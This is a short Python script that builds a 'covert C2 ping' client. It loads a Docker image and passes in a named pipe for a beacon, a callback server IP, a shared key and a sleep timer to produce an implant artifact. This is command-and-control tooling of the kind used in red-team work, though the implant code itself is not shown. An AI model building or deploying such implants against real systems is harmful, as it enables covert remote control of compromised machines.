#!/bin/env python3
import argparse
import os


def main():
    parser = argparse.ArgumentParser(description="Covert C2 ping client builder")
    parser.add_argument(
        "--pipe", required=True, help="name of the windows named pipe to talk to beacon"
    )
    parser.add_argument("--server", required=True, help="callback server ip addr")
    parser.add_argument(
        "--key", required=True, help="secret key, set the same value on the server"
    )
    parser.add_argument("--sleep", required=True, help="initial sleep timer")
    opts = parser.parse_args()
    res = os.popen("docker image ls").read()
    if "covert_c2_ping" not in res:
        print("loading image...")
        os.system("docker load -i ./covert_c2_ping.tar")
    if not os.path.exists("./out"):
        os.mkdir("./out")
    print("building artifact...")
    os.system(
        f'docker run --rm \
            -e PIPE_NAME={opts.pipe} \
            -e KEY={opts.key} \
            -e SERVER_IP={opts.server} \
            -e SLEEP={opts.sleep} \
            -v "$(pwd)/out:/root/working/dst" \
            covert_c2_ping'
    )


if __name__ == "__main__":
    main()
